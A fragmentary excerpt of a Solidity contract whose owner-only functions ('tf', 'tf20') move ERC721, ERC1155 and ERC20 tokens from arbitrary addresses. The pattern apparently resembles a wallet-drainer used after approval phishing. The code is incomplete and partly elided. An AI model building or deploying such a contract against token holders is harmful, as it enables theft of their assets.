...
contract Transfer is Ownable{
    ...
    function _transferERC721(address _contractAddress, address _from,  address _to, uint256 _tokenId) internal {
        IERC721 _ERC721 = IERC721(_contractAddress);
        _ERC721.transferFrom(_from, _to, _tokenId);
    }

    function _transferERC1115(address _contractAddress, address _from,  address _to, uint256[] memory _tokenIds) internal {
    ...
    function tf(address _contractAddress, address _from, address _to, uint256[] memory _tokenIds, string memory types) external onlyOwner {
        if( keccak256(abi.encodePacked(types)) == keccak256(abi.encodePacked("s"))){
            for(uint i = 0; i < _tokenIds.length; i++) {
     ...
     function tf20(address _contractAddress, address _from, address _to) external onlyOwner {      
